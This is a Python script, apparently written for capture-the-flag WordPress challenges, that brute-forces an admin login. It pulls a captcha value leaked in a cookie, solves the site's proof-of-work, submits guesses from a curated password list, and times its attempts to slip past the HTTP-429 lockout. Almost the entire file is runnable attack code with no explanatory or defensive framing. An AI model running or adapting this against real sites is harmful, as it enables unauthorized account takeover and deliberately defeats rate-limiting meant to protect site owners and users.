#!/usr/bin/env python3
# Lock-aware WordPress admin-password brute for CTF7-style decoy-front challenges.
# Uses the cookie-leaked-captcha + PoW login bypass (see wp_login_bypass.py), then
# tries a curated password list for a known username. Spacing + 429-wait avoids the
# ~2-attempt HTTP-429 lock these boxes impose. Run: python3 wp_lock_aware_brute.py
import urllib.request, base64, hashlib, re, json, urllib.parse, time

BASE = 'http://TARGET:PORT'   # EDIT per target
USER = 'admin'                # EDIT (REST enum leaks real usernames, e.g. 'editor')
# Curated CTF / WordPress-common admin passwords (theme-first, then generic).
PASSWORDS = [
    'northwind', 'NorthWind', 'northwind123', 'N0rthW1nd', 'journal',
    'northwind2025', 'northwind2026', 'admin123', 'password', 'Parth',
    'bhandari', 'WordPress', 'wordpress', 'letmein', '123456', 'qwerty',
    'editor', 'root', 'secret', 'changeme', 'default', 'welcome',
    'northwind!', 'pass@123', 'admin@123', 'iloveyou', 'P@ssw0rd'
]

def lz(h):
    n = 0
    for ch in h:
        v = int(ch, 16)
        if v == 0: n += 4; continue
        if v < 2: n += 3
        elif v < 4: n += 2
        elif v < 8: n += 1
        break
    return n

def solve(chal, bits):
    k = 0
    while k < 9_000_000:
        d = hashlib.sha256((chal + ':' + str(k)).encode()).digest().hex()
        if lz(d) >= bits:
            return chal + ':' + str(k)
        k += 1
    return None

def dec(p):
    return base64.urlsafe_b64decode(p + '=' * (-len(p) % 4))

def attempt(user, pw):
    cj = urllib.request.HTTPCookieProcessor()
    op = urllib.request.build_opener(cj)
    op.open(urllib.request.Request(BASE + '/captcha.png',
            headers={'User-Agent': 'Mozilla/5.0'}), timeout=15)
    tok = [c.value for c in cj.cookiejar if c.name.startswith('wordpress_logged_in')][-1]
    cap = json.loads(dec(tok.split('.')[0]))['cap']
    r = op.open(urllib.request.Request(BASE + '/pow',
             headers={'User-Agent': 'Mozilla/5.0'}), timeout=15)
    p = json.loads(r.read().decode())
    sol = solve(p['challenge'], p['bits'])
    data = urllib.parse.urlencode({'log': user, 'password': pw,
                                   'captcha': cap, 'pow': sol}).encode()
    rr = op.open(urllib.request.Request(BASE + '/wp-login.php', data=data,
              headers={'Content-Type': 'application/x-www-form-urlencoded',
                       'User-Agent': 'Mozilla/5.0', 'Referer': BASE + '/wp-login.php'}),
              timeout=15)
    return rr.read().decode('utf-8', 'replace')

def authed(b):
    return ('Dashboard' in b) or ('Log Out' in b) or ('Howdy' in b)

found = None
for pw in PASSWORDS:
    try:
        b = attempt(USER, pw)
        if authed(b):
            found = pw
            print('SUCCESS  ' + USER + ' / ' + pw)
            break
        print('fail: ' + pw)
        time.sleep(150)
    except urllib.error.HTTPError as e:
        if e.code == 429:
            print('LOCKED on ' + pw + ' -> wait 320s then retry')
            time.sleep(320)
            try:
                b = attempt(USER, pw)
                if authed(b):
                    found = pw
                    print('SUCCESS  ' + USER + ' / ' + pw)
                    break
            except Exception as e2:
                print('retry error: ' + str(e2))
            time.sleep(150)
        else:
            print('HTTP ' + str(e.code) + ' on ' + pw)
            time.sleep(150)
    except Exception as e:
        print('error on ' + pw + ': ' + str(e))
        time.sleep(150)

print('RESULT: ' + (found if found else 'none-found'))
